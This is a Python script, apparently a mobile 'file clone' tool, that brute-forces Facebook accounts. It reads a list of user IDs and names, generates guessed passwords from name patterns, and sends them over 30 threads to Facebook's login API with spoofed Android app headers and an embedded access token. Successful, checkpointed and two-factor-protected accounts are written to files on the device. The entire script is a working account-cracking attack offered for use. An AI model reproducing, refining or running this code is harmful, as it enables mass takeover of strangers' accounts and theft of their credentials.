#uft-8
#!/usr/bin/python3
#coding=utf-8
#rana
import os,sys
os.system("clear")
import os
import zlib
try:
	import os,sys,time,json,random,re,string,platform,base64,uuid,requests,io,struct
	from string import *
	from concurrent.futures import ThreadPoolExecutor as ThreadPool
except(ImportError):
    os.system("pip install requests")
    pass
ranasys = ("anaaahilsystems")

try:
    import bs4
except(ImportError):
    os.system("pip install bs4")
    pass

from bs4 import BeautifulSoup
import json,os,time,base64,random,re,sys
from requests.exceptions import ConnectionError as CError
from concurrent.futures import ThreadPoolExecutor as tpe
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[91m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;92m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
G='\x1b[1;92m'
R='\x1b[1;91m'
W='\x1b[1;97m'
S ='\x1b[1;96m'
Y ='\x1b[1;93m'
yp ='\x1b[1;95m'
mys = '\x1b[0m' 
idx = []
loop = 0
proxy_list = []
random_agents = []

##Logo##
logo =("""   
\033[1;33m  _____            _    _ ______ ______ _      
\033[1;33m |  __ \     /\   | |  | |  ____|  ____| |     
 \033[1;35m| |__) |   /  \  | |__| | |__  | |__  | |     
 \033[1;35m|  _  /   / /\ \ |  __  |  __| |  __| | |     
\033[1;32m | | \ \  / ____ \| |  | | |____| |____| |____ 
\033[1;32m |_|  \_\/_/    \_\_|  |_|______|______|______|
 
                  \033[1;32mCREDIT GOES TO SHAZIA                                                           
\033[1;32m============================================
\033[1;35m   \033[1;33mCREATED BY   :  \033[1;33mRAHEEL KHAN
\033[1;35m   \033[1;33mFACEBOK      : \033[1;33m RAHEEL
\033[1;36m   \033[1;33mGITHUB       :  \033[1;33mRAHEEL-ABBASI
\033[1;36m   \033[1;33mYOUTUBE      :  \033[1;33mShazadi Tricker
\033[1;34m   \033[1;33mTOOL VIRSION :  \033[1;33m1.5
\033[1;32m============================================\n""")

def m_k():
    os.system("clear")
    print(logo)
    print(" [1] Start File Clone")
    
    print(" [2] Contact With Admin \n\n")
    my_ = input(" [•] Sellect Option : ")
    if my_ == "1":
        os.system('xdg-open https://www.youtube.com/@shaziasardarni-zd5gv');fc()
    if my_=="2":
    	os.system('xdg-open https://www.youtube.com/@shaziasardarni-zd5gv')
    else:
    	print(' [•] Select Right Option')
def fc():
    os.system("clear")
    print(logo)
   # print(50*'-')
    try:
        file = input(" [•] File Location : ")
        for x in open(file,'r').readlines():
            idx.append(x.strip())
    except:
        print(" [•] Input Right Location ")
        m_k()
    method()
    exit()


def method():
    oku = []
    twof = []
    cpu = []
    pp = []
    os.system("clear");print(logo)
    print(f" {W}[1] System Password");print(f" {W}[2] Choice Passwords");print(f" {W}[B] Back {W}")
    clon_ = input(" [?] Sellect : ")
    if clon_ == "1":
        pas = ["first last",'firstlast','first123','first122']
        for px in pas:
            pp.append(px)
        pass
    elif clon_ == "2":
        os.system("clear");print(logo)
        lp = input(' [-] Password Limit :  ')
        if lp.isnumeric():
            for x in range(int(lp)):
            	
                pp.append(input(f' {W}[-] Password {x+1}: '))
            pass
        else:
            print(" [-] EnterOnly Number ")
            exit()
    elif clon_ == "B":
        my_main()
    else:
        exit(" [-] Please Enter Valid Option ")
    os.system("clear")
    print(logo)
    print(' [-] Cracking Limit : '+str(len(idx)))
    print(" [-] Be Patience Cracking Has Been Started")
  #  print("To stop process press CTRL c")
    print("--------------------------------------------------")
    fax = ('|')
    def rana(user):
        global loop,idx
        r = requests.Session()
        user = user.strip()
        url, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
            last = first
        for px in pp:        	        	        
            ams = str(random.randint(111,777))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,777))
            header = {"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","User-Agent": "SupportsFresco=1 modular=1 Dalvik/2.1.0 (Linux; Android 12; CPH2373 Build/RKQ1.211119.001) [FBAN/FB4A;FBAV/"+str(random.randint(111, 999))+".0.0."+str(random.randint(11, 88))+"."+str(random.randint(111, 888))+";FBPN/com.facebook.katana;FBLC/en_US;FBBV/"+str(random.randint(111111111, 888888888))+";FBCR/"+random.choice(['Zong','Sinch'])+";FBMF/vivo;FBBD/vivo;FBDV/"+random.choice(['Vivo Y21'])+";FBSV/4.0.4;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.48,width=480,height=800};FB_FW/1;] FBBK/1","X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "MOBILE.LTE","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
            px = px.replace("first", first).replace("last", last)
            px = px.lower()
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":url,"password":px,"access_token":"275254692598279|585aec5b4c27376758abb7ffcb9db2af","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
            if 'session_key' in response.text:
                print('\r{}\033[1;92m [RAHEEL-OK] {} {} {} {}'.format(G, url, fax, px, mys))
                open('/sdcard/ok.txt','a').write(f'{url}|{px}\n')
                oku.append(url)
                break
            elif 'checkpoint' in response.text:
                print('\r{}\033[1;91m [RAHEEL-CP] {} {} {} {}'.format(G, url, fax, px, mys))
                cpu.append(url)
                open('/sdcard/cp.txt','a').write(f'{url}|{px}\n')
                break
            elif 'Login approvals are on' in response.text:
                print('\r{}\033[1;94m[RAHEEL-2F] {} {} {} {}'.format(G, url, fax, px, mys))
                open('/sdcard/2f.txt','a').write(f'{url}|{px}\n')
            else:
                #print(response.text)
                continue
        sys.stdout.write('\r {} [Cracking] [{}|{}] [Succes:{}] {}\r'.format(mys, str(loop), str(len(idx)), str(len(oku)) ,mys))
        sys.stdout.flush()
        loop += 1       
    with tpe(max_workers=30) as tp:
        tp.map(rana, idx)
    print("\n-----------------------------------------------")
    print(" [-] If You Enjoy Send Feeback")
    print("-----------------------------------------------  ")
    exit()


m_k()